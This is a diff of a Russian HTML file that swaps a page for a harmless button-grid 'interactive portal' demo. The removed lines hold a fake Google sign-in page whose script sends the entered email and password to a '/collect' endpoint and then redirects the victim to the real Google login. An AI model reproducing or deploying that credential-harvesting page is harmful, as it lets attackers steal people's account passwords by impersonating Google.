@@ -2,90 +2,318 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Войдите в Google Аккаунт</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Интерактивный Портал</title>
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: white;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
         }
-        .google-header {
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+            padding: 20px;
+        }
+
+        .header h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+
+        .card h3 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 15px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: linear-gradient(45deg, #4ECDC4, #44A08D);
+            color: white;
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, #11998e, #38ef7d);
+            color: white;
+        }
+
+        .btn-warning {
+            background: linear-gradient(45deg, #FFA62E, #EA4C2C);
+            color: white;
+        }
+
+        .btn-info {
+            background: linear-gradient(45deg, #0072FF, #00C6FF);
+            color: white;
+        }
+
+        .btn-dark {
+            background: linear-gradient(45deg, #2C3E50, #4CA1AF);
+            color: white;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        .feature-section {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            margin-top: 40px;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+
+        .feature {
             text-align: center;
             padding: 20px;
         }
-        .login-container {
-            width: 450px;
-            margin: 50px auto;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 48px 40px 36px;
-        }
-        .google-logo {
-            text-align: center;
+
+        .feature-icon {
+            font-size: 3em;
             margin-bottom: 20px;
         }
-        input[type="email"], input[type="password"] {
-            width: 100%;
-            padding: 13px 15px;
-            margin: 10px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
+
+        .feature h4 {
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            color: #333;
         }
-        .next-button {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            float: right;
-            cursor: pointer;
+
+        .feature p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .animated-btn {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @media (max-width: 768px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .button-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="google-header">
-        <!-- Пустое место вместо логотипа -->
-    </div>
-    
-    <div class="login-container">
-        <div class="google-logo">
-            <h2>Войдите</h2>
-            <p>Продолжить в Google Аккаунт</p>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Интерактивный Портал</h1>
+            <p>Множество кнопок для всех ваших нужд</p>
         </div>
-        
-        <form id="loginForm" method="POST">
-            <input type="email" id="email" name="email" placeholder="Электронная почта или телефон" required>
-            <input type="password" id="password" name="password" placeholder="Введите ваш пароль" required>
-            <button type="submit" class="next-button">Далее</button>
-        </form>
+
+        <div class="grid">
+            <div class="card">
+                <h3>🚀 Основные Действия</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary animated-btn">Старт</button>
+                    <button class="btn btn-secondary">Настройки</button>
+                    <button class="btn btn-success">Профиль</button>
+                    <button class="btn btn-warning">Уведомления</button>
+                    <button class="btn btn-info">Помощь</button>
+                    <button class="btn btn-dark">Выход</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🎮 Игровые Функции</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary">Новая Игра</button>
+                    <button class="btn btn-secondary">Загрузить</button>
+                    <button class="btn btn-success">Рейтинг</button>
+                    <button class="btn btn-warning">Достижения</button>
+                    <button class="btn btn-info">Мультиплеер</button>
+                    <button class="btn btn-dark">Настройки</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>📊 Инструменты</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary">Аналитика</button>
+                    <button class="btn btn-secondary">Отчеты</button>
+                    <button class="btn btn-success">Графики</button>
+                    <button class="btn btn-warning">Экспорт</button>
+                    <button class="btn btn-info">Импорт</button>
+                    <button class="btn btn-dark">Настройки</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🎨 Творчество</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary">Новый Проект</button>
+                    <button class="btn btn-secondary">Галерея</button>
+                    <button class="btn btn-success">Шаблоны</button>
+                    <button class="btn btn-warning">Эффекты</button>
+                    <button class="btn btn-info">Фильтры</button>
+                    <button class="btn btn-dark">Экспорт</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🔧 Утилиты</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary">Калькулятор</button>
+                    <button class="btn btn-secondary">Таймер</button>
+                    <button class="btn btn-success">Заметки</button>
+                    <button class="btn btn-warning">Календарь</button>
+                    <button class="btn btn-info">Погода</button>
+                    <button class="btn btn-dark">Напоминания</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🌐 Социальное</h3>
+                <div class="button-grid">
+                    <button class="btn btn-primary">Друзья</button>
+                    <button class="btn btn-secondary">Сообщения</button>
+                    <button class="btn btn-success">Группы</button>
+                    <button class="btn btn-warning">События</button>
+                    <button class="btn btn-info">Фотографии</button>
+                    <button class="btn btn-dark">Настройки</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="feature-section">
+            <h2 style="text-align: center; margin-bottom: 40px; color: #333;">✨ Особенности Платформы</h2>
+            <div class="feature-grid">
+                <div class="feature">
+                    <div class="feature-icon">🎯</div>
+                    <h4>Интуитивный Дизайн</h4>
+                    <p>Простой и понятный интерфейс для комфортного использования</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>
+                    <h4>Высокая Скорость</h4>
+                    <p>Мгновенная реакция на все ваши действия и запросы</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>
+                    <h4>Безопасность</h4>
+                    <p>Ваши данные защищены современными технологиями шифрования</p>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">📱</div>
+                    <h4>Адаптивность</h4>
+                    <p>Идеальное отображение на всех устройствах и экранах</p>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // Отправка данных на сервер
-            fetch('/collect', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            }).then(() => {
-                // Перенаправление на настоящий Google после сбора данных
-                window.location.href = 'https://accounts.google.com';
+        // Добавляем функциональность кнопкам
+        document.querySelectorAll('.btn').forEach(button => {
+            button.addEventListener('click', function() {
+                const buttonText = this.textContent;
+                alert(`Вы нажали: ${buttonText}`);
+                
+                // Добавляем анимацию нажатия
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    this.style.transform = '';
+                }, 150);
             });
         });
+
+        // Динамическое изменение фона
+        let hue = 0;
+        setInterval(() => {
+            hue = (hue + 1) % 360;
+            document.body.style.background = `linear-gradient(135deg, hsl(${hue}, 70%, 60%) 0%, hsl(${(hue + 60) % 360}, 70%, 60%) 100%)`;
+        }, 50);
     </script>
 </body>
-</html>                                        
+</html>
